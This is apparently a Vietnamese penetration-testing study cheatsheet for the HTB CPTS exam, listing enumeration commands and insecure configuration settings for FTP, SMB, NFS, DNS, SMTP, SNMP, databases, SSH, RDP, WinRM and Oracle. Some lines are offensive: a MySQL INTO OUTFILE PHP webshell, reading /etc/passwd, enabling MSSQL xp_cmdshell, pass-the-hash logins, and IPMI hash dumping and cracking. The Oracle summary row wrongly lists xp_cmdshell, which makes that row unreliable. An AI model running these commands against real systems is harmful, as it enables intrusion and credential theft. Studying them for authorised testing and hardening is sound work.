---
title: "Footprinting & Enumeration Cheatsheet"
date: 2026-03-19 02:00:00 +0700
categories: [HTB_CPTS, Footprinting]
tags: [htb, cpts, enumeration, footprinting, recon, smb, ftp, ssh, snmp, mssql, mysql, active-directory]
description: "Tổng hợp lệnh enumeration theo từng giao thức: FTP, SMB, NFS, DNS, SMTP, SNMP, MySQL, MSSQL, SSH, RDP, WinRM và các Dangerous Settings cần nhớ."
---

> Tổng hợp các lệnh dùng trong giai đoạn **Footprinting & Enumeration** — từ OSINT/Hạ tầng cho đến liệt kê các dịch vụ cụ thể trên máy mục tiêu. Bao gồm **Dangerous Settings** cho từng giao thức.
{: .prompt-info }

---

## OSINT / Hạ Tầng

| Lệnh | Mô Tả |
|---|---|
| `curl -s "https://crt.sh/?q=<domain>&output=json" \| jq .` | Xem certificate logs tìm subdomain |
| `for i in $(cat ip-addresses.txt); do shodan host $i; done` | Quét từng IP bằng Shodan |
| `whois <domain>` | Tra cứu thông tin đăng ký tên miền |
| `theHarvester -d <domain> -b all` | Thu thập email, subdomain từ nhiều nguồn |
| `subfinder -d <domain> -o subdomains.txt` | Liệt kê subdomain thụ động |
| `amass enum -passive -d <domain>` | Thu thập thông tin thụ động với Amass |

---

## FTP — Port 21

> **Công dụng:** Truyền file giữa client và server. Không mã hoá — credentials và dữ liệu đi dạng plaintext.

| Lệnh | Mô Tả |
|---|---|
| `ftp <FQDN/IP>` | Kết nối tới FTP |
| `nc -nv <FQDN/IP> 21` | Lấy banner FTP |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp` | Kết nối FTPS |
| `wget -m --no-passive ftp://anonymous:anonymous@<IP>` | Tải toàn bộ file từ FTP |
| `nmap -sV -p 21 --script ftp-anon,ftp-bounce,ftp-syst <FQDN/IP>` | Kiểm tra FTP bằng Nmap |

> **Dangerous Settings — FTP**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `anonymous_enable=YES` | Cho phép đăng nhập không cần credentials |
| `anon_upload_enable=YES` | Anonymous có thể upload file |
| `no_anon_password=YES` | Không hỏi password khi login anonymous |
| `write_enable=YES` | Mọi user đều có thể ghi file |
| `ssl_enable=NO` | Không mã hoá → sniff được credentials |


---

## SMB — Port 445 / 139

> **Công dụng:** Chia sẻ file, thư mục, máy in trong mạng nội bộ Windows. Mục tiêu phổ biến nhất trong pentest nội bộ.

| Lệnh | Mô Tả |
|---|---|
| `smbclient -N -L //<FQDN/IP>` | Liệt kê shares bằng null session |
| `smbclient //<FQDN/IP>/<share>` | Kết nối vào share |
| `rpcclient -U "" <FQDN/IP>` | Tương tác RPC với null session |
| `smbmap -H <ip> -u <> -p "<>"` | Liệt kê shares và quyền truy cập |
| `crackmapexec smb <FQDN/IP> --shares -u '' -p ''` | Liệt kê shares bằng null session |
| `enum4linux-ng.py <FQDN/IP> -A` | Liệt kê toàn diện SMB |
| `nmap -p 445 --script smb-vuln-* <FQDN/IP>` | Kiểm tra lỗ hổng SMB |

**Lệnh bên trong rpcclient:**

| Lệnh | Mô Tả |
|---|---|
| `srvinfo` | Thông tin server |
| `enumdomusers` | Liệt kê users + RID |
| `netshareenumall` | Liệt kê toàn bộ shares + path thực |
| `queryuser <RID>` | Thông tin user theo RID |

> **Dangerous Settings — SMB (smb.conf)**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `guest ok = yes` | Kết nối không cần mật khẩu |
| `read only = no` | Cho phép ghi file vào share |
| `map to guest = bad user` | User không tồn tại → tự động thành guest |
| `smb1 enabled = yes` | SMBv1 có lỗ hổng EternalBlue (MS17-010) |


---

## NFS — Port 2049

> **Công dụng:** Chia sẻ file giữa Linux/Unix qua mạng. Auth dựa trên UID/GID → cấu hình sai có thể đọc file của bất kỳ user nào.

| Lệnh | Mô Tả |
|---|---|
| `showmount -e <FQDN/IP>` | Liệt kê NFS shares |
| `sudo mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock` | Mount NFS share |
| `sudo umount ./target-NFS` | Gỡ mount |
| `nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <FQDN/IP>` | Quét NFS |

> **Dangerous Settings — NFS (/etc/exports)**
{: .prompt-danger }

Ví dụ cấu hình nguy hiểm nhất: `/mnt/nfs  *(rw,no_root_squash)` — bất kỳ ai mount được và có quyền root!

| Setting | Nguy hiểm vì |
|---|---|
| `no_root_squash` | Root trên client = Root trên server → RW toàn bộ |
| `no_all_squash` | Giữ nguyên UID/GID → UID spoofing |
| `rw` | Cho phép ghi → upload file độc hại |
| `*(rw,no_root_squash)` | Export cho mọi IP + full quyền ☠️ |


---

## DNS — Port 53

> **Công dụng:** Phân giải tên miền thành IP. Zone Transfer thành công = lộ bản đồ toàn bộ mạng nội bộ.

| Lệnh | Mô Tả |
|---|---|
| `dig ns <domain.tld> @<nameserver>` | Truy vấn bản ghi NS |
| `dig axfr <domain.tld> @<nameserver>` | Zone Transfer — dump toàn bộ zone |
| `dig axfr internal.<domain.tld> @<nameserver>` | Zone Transfer zone nội bộ |
| `dnsenum --dnsserver <ip> --enum -p 0 -s 0 -f wordlist.txt <domain>` | Brute-force subdomain |
| `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r` | Brute-force subdomain đệ quy |
| `dnsrecon -d <domain.tld> -t axfr` | Zone transfer bằng dnsrecon |

> **Dangerous Settings — DNS (named.conf)**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `allow-transfer { any; };` | Zone Transfer từ mọi IP → lộ toàn bộ DNS records |
| `allow-query { any; };` | Cho phép mọi IP query DNS nội bộ |
| `recursion yes;` + public | DNS Amplification Attack |
| `dnssec-validation no;` | Dễ bị DNS Spoofing |


---

## SMTP — Port 25 / 587 / 465

| Lệnh | Mô Tả |
|---|---|
| `telnet <FQDN/IP> 25` | Kết nối thô tới SMTP |
| `smtp-user-enum -M VRFY -U users.txt -w 3 -m 50 -t <FQDN/IP>` | Enumerate user qua VRFY |
| `swaks --to user@target.com --from fake@fake.com --server <IP>` | Test gửi email giả |
| `nmap -p 25 --script smtp-open-relay <FQDN/IP>` | Kiểm tra Open Relay |

> **Dangerous Settings — SMTP**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `mynetworks = 0.0.0.0/0` | Open Relay — bất kỳ ai gửi email qua server |
| `disable_vrfy_command = no` | Enumerate user hợp lệ |
| `smtp_tls_security_level = none` | Không mã hoá → sniff credentials |


---

## IMAP / POP3 — Port 143 / 993 / 110 / 995

| Lệnh | Mô Tả |
|---|---|
| `curl -k 'imaps://<FQDN/IP>' --user <user>:<pass>` | Đăng nhập IMAPS, liệt kê folder |
| `curl -k 'imaps://<FQDN/IP>/<folder>;UID=<id>' --user <user>:<pass>` | Đọc email cụ thể |
| `openssl s_client -connect <FQDN/IP>:imaps` | Kết nối IMAPS thủ công |
| `openssl s_client -connect <FQDN/IP>:pop3s` | Kết nối POP3s thủ công |

> **Lệnh IMAP thủ công** (cần tag số vì IMAP hỗ trợ async):
{: .prompt-tip }

```
1 LOGIN user pass
2 LIST "" *
3 SELECT INBOX
4 FETCH 1 ALL
5 LOGOUT
```

> **Lệnh POP3 thủ công** (không cần tag vì POP3 sync từng lệnh):
{: .prompt-tip }

```
USER robin
PASS robin
LIST
RETR 1
QUIT
```


---

## SNMP — Port 161 UDP

| Lệnh | Mô Tả |
|---|---|
| `snmpwalk -v2c -c public <FQDN/IP>` | Duyệt toàn bộ OID |
| `snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2` | Liệt kê tiến trình đang chạy |
| `snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2` | Liệt kê phần mềm đã cài |
| `onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>` | Brute-force community string |

> **Dangerous Settings — SNMP**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| Community string = `public` | Mặc định → ai cũng đọc được thông tin thiết bị |
| Community string = `private` | Mặc định → ai cũng thay đổi được cấu hình |
| `rwcommunity public 0.0.0.0/0` | Read-write cho mọi IP |
| Dùng SNMPv1/v2c | Không mã hoá, không auth thực sự |


---

## MySQL — Port 3306

| Lệnh | Mô Tả |
|---|---|
| `mysql -u root -h <FQDN/IP>` | Thử login root không password |
| `mysql -u <user> -p<pass> -h <IP> --skip-ssl` | Login bỏ qua SSL |
| `nmap -p 3306 --script mysql-info,mysql-empty-password <FQDN/IP>` | Scan MySQL |

> **Lệnh hữu ích trong MySQL:**
{: .prompt-tip }

```sql
SHOW databases;
USE <database>;
SHOW tables;
SELECT user, password FROM mysql.user;
SELECT user_login, user_pass FROM wp_users;
SELECT load_file('/etc/passwd');
SELECT "<?php system($_GET['cmd']); ?>"
  INTO OUTFILE '/var/www/html/shell.php';   -- webshell ☠️
```


> **Dangerous Settings — MySQL**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `user = root` | MySQL chạy với quyền root OS |
| `bind-address = 0.0.0.0` | Expose ra internet |
| Password root trống | Đăng nhập không cần mật khẩu |
| `secure_file_priv = ""` | `load_file()` và `INTO OUTFILE` bất kỳ đâu |
| `skip-grant-tables` | Tắt hoàn toàn hệ thống phân quyền ☠️ |


---

## MSSQL — Port 1433

| Lệnh | Mô Tả |
|---|---|
| `impacket-mssqlclient <user>@<FQDN/IP> -windows-auth` | Login Windows Auth |
| `impacket-mssqlclient <user>:<pass>@<FQDN/IP>` | Login SQL Auth |
| `nmap -p 1433 --script ms-sql-info,ms-sql-empty-password <FQDN/IP>` | Scan MSSQL |

> **Lệnh hữu ích trong MSSQL:**
{: .prompt-tip }

```sql
SELECT name FROM sys.databases;
SELECT * FROM sys.sql_logins;
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';    -- RCE ☠️
```


> **Dangerous Settings — MSSQL**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `xp_cmdshell = 1` | Thực thi lệnh OS trực tiếp từ SQL ☠️ |
| SA account password yếu | Login với quyền sysadmin |
| `Mixed Mode Authentication` | Brute-force SQL auth được |
| `Ole Automation Procedures = 1` | Chạy VBScript/JScript từ SQL |


---

## IPMI — Port 623 UDP

| Lệnh | Mô Tả |
|---|---|
| `sudo nmap -sU --script ipmi-version -p 623 <IP>` | Phát hiện phiên bản IPMI |
| `msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)` | Dump hash mật khẩu |
| `hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt --username` | Crack IPMI hash (RAKP) |

> **Dangerous Settings — IPMI**
{: .prompt-danger }

| Vấn đề | Nguy hiểm vì |
|---|---|
| Password mặc định (`admin:admin`) | Đăng nhập ngay mà không cần exploit |
| IPMI 2.0 chưa patch | CVE-2013-4786 → dump hash không cần auth |
| Cipher Suite 0 được bật | Bypass authentication hoàn toàn |


---

## SSH — Port 22

| Lệnh | Mô Tả |
|---|---|
| `ssh <user>@<FQDN/IP>` | Đăng nhập SSH |
| `ssh -i private.key <user>@<FQDN/IP>` | Đăng nhập bằng private key |
| `ssh -v <user>@<FQDN/IP>` | Xem phương thức auth được hỗ trợ |
| `ssh -L 1234:localhost:5432 <user>@<FQDN/IP>` | Local Port Forwarding |
| `ssh -D 9050 <user>@<FQDN/IP>` | SOCKS proxy động |
| `nmap -p 22 --script ssh-auth-methods <FQDN/IP>` | Kiểm tra phương thức auth |

> **Dangerous Settings — SSH (sshd_config)**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| `PermitRootLogin yes` | SSH trực tiếp vào root |
| `PasswordAuthentication yes` | Cho phép brute-force password |
| `PermitEmptyPasswords yes` | Đăng nhập không cần password |
| `X11Forwarding yes` | CVE-2016-3115 — command injection |
| `Protocol 1` | SSH-1 dễ bị MITM attack |


---

## Rsync — Port 873

| Lệnh | Mô Tả |
|---|---|
| `nc -nv <FQDN/IP> 873` → `#list` | Liệt kê shares qua netcat |
| `rsync -av --list-only rsync://<FQDN/IP>/<share>` | Xem nội dung share |
| `rsync -av rsync://<FQDN/IP>/<share> ./local/` | Tải toàn bộ file về |

---

## RDP — Port 3389

| Lệnh | Mô Tả |
|---|---|
| `nmap -sV -sC <IP> -p3389 --script rdp*` | Scan RDP |
| `xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP>` | Đăng nhập RDP từ Linux |
| `xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP> /cert:ignore` | Bỏ qua SSL warning |
| `xfreerdp /u:<user> /p:"<pass>" /v:<FQDN/IP> /drive:shared,/tmp` | Chia sẻ thư mục local |

> Nmap để lại dấu vết khi scan RDP — dùng cookie `mstshash=nmap` → EDR/IDS có thể phát hiện!
{: .prompt-warning }

> **Dangerous Settings — RDP**
{: .prompt-danger }

| Setting | Nguy hiểm vì |
|---|---|
| Expose port 3389 ra internet | Brute-force + BlueKeep từ bên ngoài |
| `NLA = disabled` | Không yêu cầu auth trước khi kết nối |
| Chưa patch CVE-2019-0708 (BlueKeep) | RCE không cần credentials ☠️ |


---

## WinRM — Port 5985 / 5986

| Lệnh | Mô Tả |
|---|---|
| `evil-winrm -i <FQDN/IP> -u <user> -p <pass>` | Đăng nhập WinRM → PowerShell shell |
| `evil-winrm -i <FQDN/IP> -u <user> -H <NTLM-hash>` | Pass-the-Hash |

---

## WMI — Port 135

| Lệnh | Mô Tả |
|---|---|
| `impacket-wmiexec <user>:"<pass>"@<FQDN/IP> "whoami"` | Thực thi lệnh qua WMI |
| `impacket-wmiexec -hashes :<NTLM-hash> <user>@<FQDN/IP> "whoami"` | Pass-the-Hash qua WMI |

---

## Oracle TNS — Port 1521

| Lệnh | Mô Tả |
|---|---|
| `python3 ~/odat/odat.py sidguesser -s <IP> -p 1521` | Brute-force SID |
| `python3 ~/odat/odat.py all -s <IP> -p 1521 -d <SID>` | Quét toàn diện Oracle |
| `sqlplus <user>/<pass>@<IP>/<SID>` | Đăng nhập Oracle |
| `sqlplus <user>/<pass>@<IP>/<SID> as sysdba` | Đăng nhập quyền SYSDBA |

---

## Tổng Quan Nhanh

| Giao Thức | Cổng | Điểm Yếu Chính |
|---|---|---|
| FTP | 21 | Anonymous login, write enabled |
| SMB | 445/139 | Null session, EternalBlue |
| NFS | 2049 | no_root_squash, UID spoofing |
| DNS | 53 | Zone Transfer (allow-transfer any) |
| SMTP | 25/587 | Open Relay, VRFY enum |
| SNMP | 161 UDP | Community string mặc định |
| MySQL | 3306 | Root no-password, INTO OUTFILE |
| MSSQL | 1433 | xp_cmdshell, SA weak password |
| IPMI | 623 UDP | CVE-2013-4786 hash dump |
| SSH | 22 | PermitRootLogin, PasswordAuth |
| Rsync | 873 | Anonymous access, no auth |
| RDP | 3389 | BlueKeep, NLA disabled |
| WinRM | 5985/5986 | AllowUnencrypted, Basic Auth |
| Oracle TNS | 1521 | Default creds, xp_cmdshell |